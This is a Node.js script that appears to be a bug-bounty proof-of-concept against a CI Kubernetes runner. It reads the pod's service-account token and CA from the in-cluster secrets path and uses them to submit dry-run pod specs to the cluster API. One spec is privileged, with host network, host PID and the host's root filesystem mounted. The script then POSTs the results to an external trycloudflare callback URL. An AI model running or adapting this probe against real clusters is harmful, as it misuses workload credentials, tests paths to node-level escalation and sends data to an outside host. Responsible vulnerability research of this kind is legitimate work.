"use strict";

const fs = require("fs");
const path = require("path");
const { request, responseSummary } = require("./vrp_jit_probe.js");

const CALLBACK_URL =
  "https://seemed-peace-key-amanda.trycloudflare.com/" +
  "40854d74f16702af2988c83d014d3952";
const KSA_ROOT = "/var/run/secrets/kubernetes.io/serviceaccount";
const RUNNER_IMAGE =
  "us-docker.pkg.dev/ml-oss-artifacts-published/ml-public-container/" +
  "actions-runner@sha256:b55441578e81221abe1ddb5ffdd4b6c8cbdbe33449ede2faa5966a0c05e846d9";

function podSpec(name, variant) {
  const container = {
    name: "probe",
    image: RUNNER_IMAGE,
    command: ["/bin/true"],
    securityContext: {
      allowPrivilegeEscalation: false,
      readOnlyRootFilesystem: true,
    },
  };
  const spec = {
    automountServiceAccountToken: false,
    restartPolicy: "Never",
    containers: [container],
  };
  if (variant === "host-network") {
    spec.hostNetwork = true;
    spec.dnsPolicy = "ClusterFirstWithHostNet";
  }
  if (variant === "combined-node-boundary") {
    spec.hostNetwork = true;
    spec.hostPID = true;
    spec.dnsPolicy = "ClusterFirstWithHostNet";
    container.securityContext = {
      privileged: true,
      readOnlyRootFilesystem: true,
    };
    container.volumeMounts = [
      { name: "host-root", mountPath: "/mnt/host", readOnly: true },
    ];
    spec.volumes = [
      { name: "host-root", hostPath: { path: "/", type: "Directory" } },
    ];
  }
  return {
    apiVersion: "v1",
    kind: "Pod",
    metadata: {
      name,
      labels: { "security-review": "server-dry-run-only" },
    },
    spec,
  };
}

function admissionSummary(response) {
  const value = response && response.value;
  const spec = response && response.ok && value && value.spec;
  const container =
    spec && Array.isArray(spec.containers) ? spec.containers[0] : null;
  const causes =
    value && value.details && Array.isArray(value.details.causes)
      ? value.details.causes.slice(0, 10).map((cause) => ({
          reason: cause.reason || null,
          field: cause.field || null,
          message: cause.message || null,
        }))
      : [];
  return {
    ...responseSummary(response),
    accepted: Boolean(response && response.ok && response.status === 201),
    status_reason: value && value.reason ? value.reason : null,
    admission_causes: causes,
    returned_spec_projection: spec
      ? {
          host_network: Boolean(spec.hostNetwork),
          host_pid: Boolean(spec.hostPID),
          automount_service_account_token:
            spec.automountServiceAccountToken ?? null,
          privileged: Boolean(
            container &&
              container.securityContext &&
              container.securityContext.privileged,
          ),
          host_path_present: Boolean(
            Array.isArray(spec.volumes) &&
              spec.volumes.some((volume) => volume.hostPath),
          ),
        }
      : null,
    pod_body_returned: false,
  };
}

async function runVariant(call, context, name, variant) {
  const body = Buffer.from(JSON.stringify(podSpec(name, variant)));
  const create = await call({
    protocol: "https:",
    hostname: context.host,
    port: context.port,
    requestPath:
      `/api/v1/namespaces/${encodeURIComponent(context.namespace)}/pods` +
      "?dryRun=All&fieldManager=keras-vrp-admission-proof&fieldValidation=Strict",
    method: "POST",
    ca: context.ca,
    body,
    headers: {
      Accept: "application/json",
      Authorization: `Bearer ${context.token}`,
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  const after = await call({
    protocol: "https:",
    hostname: context.host,
    port: context.port,
    requestPath:
      `/api/v1/namespaces/${encodeURIComponent(context.namespace)}/pods/` +
      encodeURIComponent(name),
    method: "GET",
    ca: context.ca,
    headers: {
      Accept: "application/json",
      Authorization: `Bearer ${context.token}`,
    },
  });
  return {
    variant,
    create: admissionSummary(create),
    post_dry_run_get: responseSummary(after),
    absent_after_dry_run: after.status === 404,
    dry_run_parameter_sent: true,
    persistent_create_sent: false,
    pod_scheduled: false,
    container_started: false,
  };
}

async function collect(call = request, readFile = fs.readFileSync, now = Date.now()) {
  const namespace = readFile(path.join(KSA_ROOT, "namespace"), "utf8").trim();
  const token = readFile(path.join(KSA_ROOT, "token"), "utf8").trim();
  const ca = readFile(path.join(KSA_ROOT, "ca.crt"));
  const host = process.env.KUBERNETES_SERVICE_HOST;
  const port = process.env.KUBERNETES_SERVICE_PORT_HTTPS || "443";
  if (!host || !namespace || !token) throw new Error("Kubernetes context missing");
  const context = { namespace, token, ca, host, port };
  const suffix = String(now);
  const variants = [];
  for (const variant of [
    "baseline",
    "host-network",
    "combined-node-boundary",
  ]) {
    variants.push(
      await runVariant(
        call,
        context,
        `vrp-dryrun-${variant.replaceAll("-", "")}-${suffix}`,
        variant,
      ),
    );
  }
  return {
    phase: "keras-kubernetes-admission-dry-run",
    captured_at: new Date().toISOString(),
    safety: {
      kubernetes_token_returned: false,
      server_side_dry_run_only: true,
      persistent_create_sent: false,
      pod_scheduled: false,
      container_started: false,
      host_metadata_requested: false,
      node_credential_requested: false,
      secret_requested: false,
      write_operation_persisted: false,
    },
    namespace,
    variants,
  };
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

if (require.main === module) {
  if (process.env.VRP_K8S_DRYRUN_WRAPPER_TEST === "1") {
    process.exit(0);
  } else {
    collect()
      .then(send)
      .then(() => process.exit(0))
      .catch(() => process.exit(1));
  }
}

module.exports = { admissionSummary, collect, podSpec, runVariant };
